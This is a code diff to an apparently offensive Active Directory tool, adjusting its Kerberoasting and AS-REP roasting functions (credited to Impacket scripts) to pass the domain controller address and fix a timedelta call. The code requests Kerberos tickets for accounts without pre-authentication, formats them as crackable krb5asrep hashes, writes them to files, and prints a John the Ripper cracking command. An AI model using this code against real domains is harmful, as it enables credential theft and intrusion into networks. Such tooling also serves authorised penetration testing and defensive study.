@@ -453,7 +453,7 @@ class EnumerateAD(object):
 			print('')
 		console.print('[-] Found {0} account(s) that dont require pre-authentication'.format(len(self.conn.entries)), style = "info")
 		if self.asrep:
-				ExploitAD.ASREPRoast(self.users, self.domain, self.status)
+				ExploitAD.ASREPRoast(self.users, self.domain, self.dc_ip, self.status)
 		else:	
 			sys.exit(1)
 		
@@ -671,7 +671,7 @@ class ExploitAD(object):
 			print("[!] Possibly vulnerable to CVE-2021-42287. \n\n[+] Apply Patches")
 			print("<"*3+"-"*51+'>'*3)	
 				
-	#Kerberoasting			
+	#Kerberoasting: From GETUserSPNs.py			
 	def kerberoast(dc_ip, spn, username, password, domain, status):
 		
 		status.update(status="[bold white]Kerberoasting SPN Accounts...")
@@ -740,7 +740,8 @@ class ExploitAD(object):
 					for key, value in user_tickets.items():
 						f.write('{0}:{1}\n'.format(key, value))
 				if len(user_tickets.keys()) >= 1:
-					console.print('Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), domain))	
+					console.print('Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()),
+					domain))	
 			else:
 				console.print('Received {0} ticket(s) for Kerberoasting'.format(len(user_tickets.keys())))
 			
@@ -750,8 +751,8 @@ class ExploitAD(object):
 			console.print('Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
 			sys.exit(1)
 
-	#ASREPRoast
-	def ASREPRoast(users, domain, status):
+	#ASREPRoast: From GetNPUsers.py
+	def ASREPRoast(users, domain, dc_ip, status):
 
 		status.update(status="[bold white]ASREP Roasting...")
 		sleep(1)
@@ -788,7 +789,7 @@ class ExploitAD(object):
 
 			requestBody['realm'] = Domain
 
-			now = datetime.utcnow() + datetime.timedelta(days=1)
+			now = datetime.utcnow() + timedelta(days=1)
 			requestBody['till'] = KerberosTime.to_asn1(now)
 			requestBody['rtime'] = KerberosTime.to_asn1(now)
 			requestBody['nonce'] = random.getrandbits(31)
@@ -800,20 +801,21 @@ class ExploitAD(object):
 			msg = encoder.encode(asReq)
 
 			try:
-				response = sendReceive(msg, Domain, domain)
+				response = sendReceive(msg, Domain, dc_ip)
 			except KerberosError as e:
 				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
 					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
 					seq_set_iter(requestBody, 'etype', supportedCiphers)
 					msg = encoder.encode(asReq)
-					response = sendReceive(msg, Domain, domain)
+					response = sendReceive(msg, Domain, dc_ip)
 				else:
 					print(e)
 					continue
 
 			asRep = decoder.decode(response, asn1Spec=AS_REP())[0]
 
-			hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, Domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
+			hashes.append('$krb5asrep${0}@{1}:{2}${3}'.format(usr, Domain, hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(), 
+							hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode()))
 
 		if len(hashes) > 0:
 			with open('{0}-jtr-hashes'.format(domain), 'w') as f:
